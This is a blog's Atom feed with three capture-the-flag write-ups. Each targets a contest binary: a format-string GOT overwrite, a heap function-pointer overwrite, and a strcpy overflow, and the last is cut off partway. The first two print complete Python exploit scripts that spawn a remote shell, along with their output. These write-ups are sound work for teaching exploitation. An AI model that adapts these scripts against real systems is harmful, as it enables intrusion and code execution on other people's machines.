<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Pwnable | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/pwnable/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-09-22T23:07:26+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CSAW 2015 - Pwn250]]></title>
    <link href="http://barrebas.github.io/blog/2015/09/22/csaw-2015-pwn250/"/>
    <updated>2015-09-22T23:00:00+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/09/22/csaw-2015-pwn250</id>
    <content type="html"><![CDATA[<p>This CTF marked our team&rsquo;s anniversary! We managed to pop this pwnable.</p>

<!--more-->


<p>We&rsquo;re given a 32-bit ELF binary, which uses malloc() and free(). Must be some kind of heap vulnerability then, right?</p>

<p>The binary is some kind of contact storage. We can enter names, phone numbers and descriptions. The name gets stored in the .bss segment, while the phone number and description are stored on the heap. We can overflow the name field like so:</p>

<pre><code>Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 1
Contact info: 
    Name: BARREBAS
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 0  
    Length of description: 100       
    Enter description:
        BLEH
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 4
Contacts:
    Name: BARREBAS
    Length 100
    Phone #: 0
    Description: BLEH
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 3
Name to change? BARREBAS
1.Change name
2.Change description
&gt;&gt;&gt; 1
New name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 4
Contacts:
    Name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
    Length 1111638594
    Phone #: 0
    Description: BLEH
</code></pre>

<p>So suppose the struct looked something like</p>

<pre><code class="c">struct {
    char *phoneNumber;  // malloc'ed
    char *description;  // malloc'ed
    char name[64];
    int descriptionLength;
    int valid;
} info_t;
</code></pre>

<p>We can use this to leak information by overwriting the <strong>next</strong> struct&rsquo;s <em>phoneNumber</em> and <em>description</em>. We cannot use this to write anything, as the program will automatically call free() on the description. If it doesn&rsquo;t contain a valid heap address, the binary will crash. First, we&rsquo;ll abuse the leak to determine the remote libc version.</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
      buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def leak(x):
    print "leaking " + hex(x)
    global last_addr
    # edit contact 1 -&gt; name to overflow pointers
    sendln('3')
    readtil('change? ')
    if last_addr == 0:
        sendln('BAR1')
    else:
        sendln('B'*63)

    readtil('&gt;&gt;&gt; ')
    sendln('1')
    readtil('name:')
    #       name          length valid  char *description // char *phone==leak-&gt;malloc@got  
    sendln('B'*63+"\x00"+"BBBB"+p(0)+p(x)+p(x)+"BAR2")
    last_addr = x

    readtil('&gt;&gt;&gt; ')

    sendln('4')
    data = readtil('&gt;&gt;&gt; ')
    m = re.findall('Phone #: (.*)', data)
    return m[0]

def leak4(x):
    return struct.unpack('I', leak(x)[0:4])[0]

def pwn():
    global s
    global last_addr
    last_addr = 0
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('127.0.0.1', 4444))
    s.connect(('54.165.223.128', 2555))
    readtil('&gt;&gt;&gt; ')

    # create contact 1
    sendln('1')
    readtil('Name: ')
    sendln('BAR1')
    readtil('Phone No: ')
    sendln('0')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLEH')

    readtil('&gt;&gt;&gt; ')

    # create contact 2
    sendln('1')
    readtil('Name: ')
    sendln('BAR2')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')

    readtil('&gt;&gt;&gt; ')

    malloc = leak4(0x804b020)
    print "[+] malloc @ " + hex(malloc)
    puts = leak4(0x804b024)
    print "[+] puts   @ " + hex(puts)
</code></pre>

<p>This gave us two addresses, and <a href="http://libcdb.com/">libcdb.com</a> gave us no less than five options. We logged back into the server for pwn100, which had a different IP address so was probably a differnent box. We figured that the CTF organizers used the same base image for each box. The symbols of the libc on pwn100&rsquo;s box seemed to match what we found via the leak and we just got the address of system from that machine.</p>

<p>Now, we needed a way to write to the got. Turns out there was another format string vulnerability in the description field:</p>

<pre><code>Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 1
Contact info: 
    Name: BAR1
[DEBUG] Haven't written a parser for phone numbers; You have 10 numbers
    Enter Phone No: 0
    Length of description: 100
    Enter description:
        %X-%X-%X-%X-%X-%X
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 4
Contacts:
    Name: BAR1
    Length 100
    Phone #: 0
    Description: 9B24008-F77724E0-F7771FF4-0-0-FFDE40D8
Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt;
</code></pre>

<p>We used the same trick as in <a href="https://ctf-team.vulnhub.com/eko-party-pre-ctf-2015-echoes/">ekoparty&rsquo;s echoes binary</a>, selecting a stack address (actually a saved stack frame pointer) which points to another stack address, which we can then use to write out an address on the stack. Finally, use that third format string argument to write anything anywhere.</p>

<p>We then use the leak to determine libc&rsquo;s base address, add the offset for system, and finally overwrite memset@got with system. Then, once we delete an element with name <code>/bin/sh</code>, we in fact call <code>system('/bin/sh')</code> and we win.</p>

<p>Without further ado:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
      buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)


def write(x, i):
    # first, leak address to which we'll write ($30) so that we can align the writes to $30
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('ZZZZ%18$.08xBBBB')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    data = readtil('&gt;&gt;&gt; ')
    m = re.findall('ZZZZ(.*)BBBB', data)

    addr = m[0].decode('hex')
    addr = struct.unpack('&gt;I', addr)[0]
    start = addr &amp; 0xff

# setup $30 to x (addr to write) via $18 by first setting $6-&gt;$18
#-----------
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start+1) + 'c%6$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ') 

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x &gt;&gt; 8) &amp; 0xff)+'c%18$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')
#-----------
#-----------
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start+2) + 'c%6$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x &gt;&gt; 16) &amp; 0xff)+'c%18$hhn')
#   readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')
#-----------
#-----------
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start+3) + 'c%6$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x &gt;&gt; 24) &amp; 0xff)+'c%18$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')
#-----------

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(start) + 'c%6$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(x &amp; 0xff)+'c%18$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

# start writing bytes       
#---write first byte
    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str(i &amp; 0xff) + 'c%30$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')


    sendln('3')
    readtil('change?')
    sendln('BAR4')
    readtil('&gt;&gt;&gt;')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x+1) &amp; 0xff)+'c%18$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((i &gt;&gt; 8) &amp; 0xff) + 'c%30$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x+2) &amp; 0xff)+'c%18$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((i &gt;&gt; 16) &amp; 0xff) + 'c%30$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((x+3) &amp; 0xff)+'c%18$hhn')
    #readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')

    sendln('3')
    readtil('change? ')
    sendln('BAR4')
    readtil('&gt;&gt;&gt; ')
    sendln('2')
    readtil('iption:')
    sendln('1000')
    readtil('iption:')
    sendln('%'+str((i &gt;&gt; 24) &amp; 0xff) + 'c%30$hhn')
    readtil('&gt;&gt;&gt; ')
    sendln('4')
    readtil('&gt;&gt;&gt; ')


def leak(x):
    print "leaking " + hex(x)
    global last_addr
    # edit contact 1 -&gt; name to overflow pointers
    sendln('3')
    readtil('change? ')
    if last_addr == 0:
        sendln('BAR1')
    else:
        sendln('B'*63)

    readtil('&gt;&gt;&gt; ')
    sendln('1')
    readtil('name:')
    #       name   len    valid   char *description==write1-&gt;free@got // char *phone==leak1-&gt;malloc@got  
    sendln('B'*63+"\x00"+"BBBB"+p(0)+p(x)+p(x)+"BAR2")
    last_addr = x

    readtil('&gt;&gt;&gt; ')

    sendln('4')
    data = readtil('&gt;&gt;&gt; ')
    m = re.findall('Phone #: (.*)', data)
    return m[0]

def leak4(x):
    return struct.unpack('I', leak(x)[0:4])[0]

def pwn():
    global s
    global last_addr
    last_addr = 0
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('127.0.0.1', 4444))
    s.connect(('54.165.223.128', 2555))
    readtil('&gt;&gt;&gt; ')

    # create contact 1
    sendln('1')
    readtil('Name: ')
    sendln('BAR1')
    readtil('Phone No: ')
    sendln('0')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLEH')

    readtil('&gt;&gt;&gt; ')

    # create contact 2
    sendln('1')
    readtil('Name: ')
    sendln('BAR2')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')

    readtil('&gt;&gt;&gt; ')

    # create contact 3 (used in write)
    sendln('1')
    readtil('Name: ')
    sendln('BAR4')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')

    readtil('&gt;&gt;&gt; ')

    # create contact 4 (used as payload for system())
    sendln('1')
    readtil('Name: ')
    sendln('/bin/sh')
    readtil('Phone No: ')
    sendln('1')
    readtil('description: ')
    sendln('100')
    readtil('description:')
    sendln('BLAH')

    readtil('&gt;&gt;&gt; ')

    # 00064c10 W puts
    # 00075b30 malloc
    # 0004cc40 T print


    malloc = leak4(0x804b020)
    print "[+] malloc @ " + hex(malloc)

    libc = malloc - 0x0075b30
    print "[+] libc @ " + hex(libc)

    # 0003fcd0 W system
    system = libc + 0x003fcd0

    print "[+] system @ " + hex(system)

    print "[+] overwriting memset@got with system the hard way"
    write(0x804b03c, system)

    print "[+] deleting element"

    sendln('2')
    readtil('remove?')
    sendln('/bin/sh')


    t=telnetlib.Telnet()
    t.sock =s 
    t.interact()


    s.close()
pwn()
</code></pre>

<p>And in action:</p>

<pre><code>bas@tritonal:~/bin/csaw15/pwn250$ python ./pwn250poc.py 
leaking 0x804b020
[+] malloc @ 0xf7619b30
[+] libc @ 0xf75a4000
[+] system @ 0xf75e3cd0
waiting...
[+] overwriting memset@got with system the hard way
writing 0x804b03c
['ffade868']
0x68

    Menu:
1)Create contact
2)Remove contact
3)Edit contact
4)Display contacts
5)Exit
&gt;&gt;&gt; 
[+] deleting element
Name to remove? /bin/sh
id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cd 
ls
contacts_54f3188f64e548565bc1b87d7aa07427
flag
cat flag
flag{f0rm47_s7r1ng5_4r3_fun_57uff}
</code></pre>

<p>Gotta love format string vulnerabilities. The flag was <code>flag{f0rm47_s7r1ng5_4r3_fun_57uff}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Dkm]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm/"/>
    <updated>2015-08-18T21:36:14+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-dkm</id>
    <content type="html"><![CDATA[<p>Writeup coming soon! For now, here&rsquo;s the exploit.</p>

<!--more-->


<pre><code class="python">#!/usr/bin/python
import struct, time
from socket import *

def q(x):
    return struct.pack("&lt;Q", x)

def readtil(delim):
  buf = b''
  while not delim in buf:
      buf += s.recv(1)
  return buf

def add_dkm_without_wifi(comment=""):
    s.send('2\n')
    s.send('2\n')
    s.send('\n')
    s.send('\n')
    s.send(comment+'\n')

def add_dkm_with_wifi(comment):
    s.send('2\n')
    s.send('1\n')
    s.send('\n')
    s.send('\n')
    s.send('\n')
    s.send(comment+'\n')

def edit_dkm_without_wifi(id,comment):
    s.send('4\n')
    s.send(str(id)+'\n')
    s.send('2\n')
    s.send('1\n')
    s.send('1\n')
    s.send(comment+'\n')
    #s.send('\n')

def edit_dkm_with_wifi(id,ssid):
    s.send('4\n')
    s.send(str(id)+'\n')
    s.send('1\n')
    s.send('\n')
    s.send('\n')
    s.send('\n')
    #s.send(ssid+'\n')
    s.send('\n')

def delete_dkm(id):
    s.send('3\n')
    s.send(str(id)+'\n')

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('challs.campctf.ccc.ac', 10102))
    #s.connect(('localhost', 4444))

    raw_input('dbg')

    readtil('Exit')
    add_dkm_with_wifi('')
    print readtil('Exit')
    print 'adding second wifi'
    add_dkm_with_wifi('')
    print readtil('Exit')

    edit_dkm_without_wifi(0, q(0x602040))

    s.send('1\n')
    readtil('SSID: ')
    data= s.recv(6)

    data += "\x00\x00"
    strtoull = (struct.unpack('&lt;Q', data)[0])
    libc = strtoull - 0x000000000003b1a0 

    print 'libc: %x' % libc
    system = libc + 0x443d0
    print 'system: %x' % system

    print readtil('Exit')
    print 'deleting second wifi'
    delete_dkm(1)
    print readtil('Exit')
    print 'shrinking first wifi'
    edit_dkm_without_wifi(0,'') # resize it
    print readtil('Exit')
    print 'adding second nowifi'
    add_dkm_without_wifi() # allocate new struct next to old dk
    print readtil('Exit')

    # edit first struct (now resized) as large struct, so the comment goes into the next chunk's function pointers
    s.send('4\n')
    s.send('0\n')
    s.send('3\n')
    s.send('1\n')
    s.send('1\n')
    s.send('1\n')
    s.send('1\n')
    #payload = "".join(["%04d" % x for x in range(1023/4)])
    # ugly padding
    payload = "AAAA"+"/bin/sh; #"*80+"AAAA"+q(system)
    s.send(payload+'\n')

    # execute struct-&gt;edit_with_wifi (overwritten with system)
    s.send('4\n')
    s.send('1\n')
    s.send('3\n')   # code exec much?

    import telnetlib
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
    s.close()
pwn()
</code></pre>

<p>And against the remote binary:</p>

<pre><code class="bash">ubuntu@ubuntu-VirtualBox:~$ python poc.py 
dbg

&gt; Does the DK have wifi?
1) Yes
2) No
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter the number of ssids, this DK supports.
&gt; Please enter a comment for this DK.
&gt; DK #0 successfully added.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
adding second wifi

&gt; Does the DK have wifi?
1) Yes
2) No
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter the number of ssids, this DK supports.
&gt; Please enter a comment for this DK.
&gt; DK #1 successfully added.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
libc: 7f912685f000
system: 7f91268a33d0

 Comment: 

DK #1 with wifi @ 0.0000/0.0000:
 Comment: 


Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
deleting second wifi

&gt; Enter DK index: 
&gt; DK #1 successfully deleted.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
shrinking first wifi

&gt; Enter DK index: 
&gt; Editing DK #0:
Does the DK have wifi?
1) Yes
2) No
3) Do not change
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter a comment for this DK.
&gt; DK #0 successfully saved.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
adding second nowifi

&gt; Does the DK have wifi?
1) Yes
2) No
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter a comment for this DK.
&gt; DK #1 successfully added.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit

&gt; Enter DK index: 
&gt; Editing DK #0:
Does the DK have wifi?
1) Yes
2) No
3) Do not change
&gt; Please enter longitude * 10000:
&gt; Please enter latitude * 10000:
&gt; Please enter the number of ssids, this DK supports.
&gt; Please enter the name of SSID #0.
&gt; Please enter a comment for this DK.
&gt; DK #0 successfully saved.
Menu:
1) List DK's
2) Add a DK
3) Remove a DK
4) Edit a DK
5) Exit
&gt; Enter DK index: 
&gt; Editing DK #1:
Does the DK have wifi?
1) Yes
2) No
3) Do not change
&gt; id
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
cat flag.txt
cat: flag.txt: No such file or directory
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd home
ls
challenge
cd cha*
ls
challenge
flag.txt
cat flag.txt
CAMP15_aecbde52de8b1ed16bf62aa772d53a2
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CAMP CTF - Secret_File]]></title>
    <link href="http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file/"/>
    <updated>2015-08-18T21:35:08+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/08/18/camp-ctf-secret-file</id>
    <content type="html"><![CDATA[<p>In this case, we&rsquo;re asked to retrieve a secret file and given.. another binary. What did you expect? ;-)</p>

<!--more-->


<pre><code class="bash">bas@tritonal:~/bin/ccc/secret_file$ ./secret_file 
AAAA
wrong password!
</code></pre>

<p>Hmm. Let&rsquo;s see what makes this thing tick:</p>

<pre><code class="bash">bas@tritonal:~/bin/ccc/secret_file$ strings ./secret_file 
/lib64/ld-linux-x86-64.so.2
x]Cm
libcrypto.so.1.0.0
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
SHA256_Final
SHA256_Init
_init
SHA256_Update
_fini
libc.so.6
strcpy
strrchr
puts
__stack_chk_fail
stdin
popen
fgets
fclose
getline
__cxa_finalize
strcmp
__libc_start_main
snprintf
_edata
__bss_start
_end
GLIBC_2.4
GLIBC_2.2.5
AUATUSH
[]A\A]
D$x1
D$xdH3
[]A\A]
D$h1
/bin/catH
 ./secreH
t_data.aH
9387a00eH
D$ H
31e413c5H
D$(H
5af9c08cH
D$0H
69cd119aH
D$8H
b4685ef3H
D$@H
bc8bcbe1H
D$HH
cf821611H
D$PH
19457127H
D$X1
D$hdH3
AWAVA
AUATL
[]A\A]A^A_
%02x
wrong password!
;*3$"
</code></pre>

<p>We see strings like <code>bc8bcbe1H</code>, which look like part of a hash being pushed onto the stack. Combining the hash part gives a SHA256 hash which has no known plaintext. Hmmm! Since this is an exploit-focused binary, let&rsquo;s exploit it!</p>

<p>It gets interesting around this code:</p>

<pre><code>     e8e:   rep stos QWORD PTR es:[rdi],rax
     e91:   lea    rdi,[rbx+0x100]
     e98:   mov    rcx,rsp
     e9b:   movabs rax,0x7461632f6e69622f
     ea5:   mov    QWORD PTR [rsp],rax
     ea9:   movabs rax,0x65726365732f2e20
     eb3:   mov    QWORD PTR [rsp+0x8],rax
     eb8:   movabs rax,0x612e617461645f74
     ec2:   mov    QWORD PTR [rsp+0x10],rax
     ec7:   mov    eax,0x6373
     ecc:   mov    WORD PTR [rsp+0x18],ax
     ed1:   xor    eax,eax
     ed3:   call   a30 &lt;snprintf@plt&gt;
     ed8:   lea    rcx,[rsp+0x20]
     edd:   mov    esi,0x41
     ee2:   movabs rax,0x6530306137383339
     eec:   mov    QWORD PTR [rsp+0x20],rax
     ef1:   lea    rdi,[rbx+0x11b]
     ef8:   movabs rax,0x3563333134653133
     f02:   mov    QWORD PTR [rsp+0x28],rax
     f07:   lea    rdx,[rip+0x106]        # 1014 &lt;_fini+0x10&gt;
     f0e:   movabs rax,0x6338306339666135
     f18:   mov    QWORD PTR [rsp+0x30],rax
     f1d:   movabs rax,0x6139313164633936
     f27:   mov    QWORD PTR [rsp+0x38],rax
     f2c:   movabs rax,0x3366653538363462
     f36:   mov    QWORD PTR [rsp+0x40],rax
     f3b:   movabs rax,0x3165626362386362
     f45:   mov    QWORD PTR [rsp+0x48],rax
     f4a:   movabs rax,0x3131363132386663
     f54:   mov    QWORD PTR [rsp+0x50],rax
     f59:   movabs rax,0x3732313735343931
     f63:   mov    QWORD PTR [rsp+0x58],rax
     f68:   xor    eax,eax
     f6a:   mov    BYTE PTR [rsp+0x60],0x0
     f6f:   call   a30 &lt;snprintf@plt&gt;
     f74:   mov    rax,QWORD PTR [rsp+0x68]
     f79:   xor    rax,QWORD PTR fs:0x28
     f82:   jne    f8a &lt;__cxa_finalize@plt+0x4aa&gt;
     f84:   add    rsp,0x70
     f88:   pop    rbx
     f89:   ret    
</code></pre>

<p>It passes a few strings to the stack. We&rsquo;ll be seeing them later. Let&rsquo;s run the binary in <code>gdb</code>.</p>

<pre><code class="bash">gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
</code></pre>

<p>PIE is enabled, so find out the base address of the binary with <code>vmmap</code>. Our input gets processed here:</p>

<pre><code>     b40:   call   ad0 &lt;getline@plt&gt;
     b45:   cmp    rax,0xffffffffffffffff
     b49:   je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
     b4f:   mov    rdi,QWORD PTR [rsp+0x8]
     b54:   mov    esi,0xa
     b59:   call   a40 &lt;strrchr@plt&gt;
     b5e:   test   rax,rax
     b61:   je     c4c &lt;__cxa_finalize@plt+0x16c&gt;
     b67:   mov    BYTE PTR [rax],0x0
     b6a:   mov    rsi,QWORD PTR [rsp+0x8]
     b6f:   mov    rdi,r13
     b72:   lea    rbp,[r13+0x15c]
     b79:   lea    rbx,[r13+0x17c]
     b80:   lea    r12,[r13+0x1bc]
     b87:   call   9e0 &lt;strcpy@plt&gt;
</code></pre>

<p>We have an unchecked <code>strcpy</code>. Lovely. Let&rsquo;s see what it will copy where:</p>

<pre><code>gdb-peda$ vmmap
Start              End                Perm  Name
0x0000555555554000 0x0000555555556000 r-xp  /home/bas/bin/ccc/secret_file/secret_file
0x0000555555755000 0x0000555555756000 r--p  /home/bas/bin/ccc/secret_file/secret_file
0x0000555555756000 0x0000555555757000 rw-p  /home/bas/bin/ccc/secret_file/secret_file
...
gdb-peda$ b *0x0000555555554000+0xb87
Breakpoint 4 at 0x555555554b87
gdb-peda$ c

...

=&gt; 0x555555554b87:  call   0x5555555549e0 &lt;strcpy@plt&gt;
   0x555555554b8c:  mov    edx,0x100
   0x555555554b91:  mov    rsi,rbp
   0x555555554b94:  mov    rdi,r13
   0x555555554b97:  call   0x555555554dd0
Guessed arguments:
arg[0]: 0x7fffffffe190 --&gt; 0x0 
arg[1]: 0x555555757010 --&gt; 0x41414141 ('AAAA')
</code></pre>

<p>So it will copy our input to the stack. Let&rsquo;s examine the stack:</p>

<pre><code>gdb-peda$ x/200wx 0x7fffffffe190
0x7fffffffe190: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe200: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe210: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe220: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe230: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe240: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe250: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe260: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe270: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe280: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe290: 0x6e69622f  0x7461632f  0x732f2e20  0x65726365
0x7fffffffe2a0: 0x61645f74  0x612e6174  0x39006373  0x61373833
0x7fffffffe2b0: 0x33653030  0x31346531  0x35356333  0x63396661
0x7fffffffe2c0: 0x36633830  0x31646339  0x62613931  0x35383634
0x7fffffffe2d0: 0x62336665  0x63623863  0x63316562  0x31323866
0x7fffffffe2e0: 0x31313136  0x37353439  0x00373231  0x00007fff
0x7fffffffe2f0: 0x00000000  0x00000000  0xf7ffa828  0x00007fff
0x7fffffffe300: 0xffffe390  0x00007fff  0xffffe3a8  0x00007fff
0x7fffffffe310: 0x00000000  0x00000001  0xf7ffe758  0x00007fff
0x7fffffffe320: 0x13742321  0x00000000  0xf7a071ef  0x00007fff
</code></pre>

<p>Nice, what are those bytes at <code>0x7fffffffe290</code>?</p>

<pre><code>gdb-peda$ x/2s 0x7fffffffe290
0x7fffffffe290:  "/bin/cat ./secret_data.asc"
0x7fffffffe2ab:  "9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127"
</code></pre>

<p>Hey, that second one looks like the SHA256 hash! We&rsquo;ll be able to overwrite this&hellip; Seeing as it&rsquo;s stored as a string, better set a breakpoint on <code>strcmp()</code> for later&hellip;</p>

<pre><code>     bd5:   call   a80 &lt;strcmp@plt&gt;
</code></pre>

<p>Restarted the binary:</p>

<pre><code>gdb-peda$ b *0x0000555555554000+0xbd5
Breakpoint 2 at 0x555555554bd5
